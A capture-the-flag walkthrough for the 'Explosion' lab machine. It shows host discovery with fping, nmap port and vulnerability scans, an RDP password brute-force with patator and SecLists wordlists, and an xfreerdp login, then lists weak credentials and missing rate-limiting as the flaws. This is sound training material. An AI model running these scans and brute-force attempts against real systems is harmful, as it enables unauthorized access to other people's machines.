# Explosion Walkthrough
## Basic instruction to start the lab

###### Establish VPN connection
By using openVPN tool you can establish VPN connection.
```bash
openvpn blabla.ovpn
```
> Replace blabla.ovpn with your own VPN profile.

###### Test connection
One of the most popular to test the connectio between two end-points is ping.
```bash
ping <target_ip>
```
> Take in your considration, the way to test the connection and check if the host is live (ping). On the real life environment, most likely ping is denied on the network level or on the host to make identify hosr life harder.

```bash
fping -a -g 10.129.145.72/24 2> /dev/null | tee 00-fping-host-discovery.result
```
> I am usually depending on fping to discover the live hosts within specific ranges via ping method.

###### Scan the open ports and banner grabbing
nmap one of the most popular tool to scan the hosts and perform banner grabbing.
```bash
nmap -sS <host_ip> -A --osscan-guess

[Options]
-A: Enable OS detection, version detection, script scanning, and traceroute
--osscan-guess: Guess OS more aggressively
```

###### Run vulnerability scan via nmap
```bash
nmap -sS 10.129.145.72 -p 135,139,445,3389 --script vuln -oA 02-nmap-run-vuln-script.result
```

###### Bruteforce RDP via [patator tool](https://github.com/lanjelot/patator)
> Patator is exist amid the kali linux suite.
```
patator rdp_login host=10.129.145.72  0=~/Desktop/sec-lists/misc/SecLists-master/Usernames/top-usernames-shortlist.txt 1=~/Desktop/sec-lists/misc/SecLists-master/Usernames/top-usernames-shortlist.txt password=FILE1 user=FILE0 
```
> To solve the machine you have to find the correct credential.

> Connect RDP through xfreerdp `xfreerdp /v:<target_ip> /u:<username> /cert:ignore /p:<password>`

###### Weakness!
* Weak credentials.
* Missing rate-limit. 

<p align="center" text> Good Luck </p>
<p align="center" text> Kemet </p>

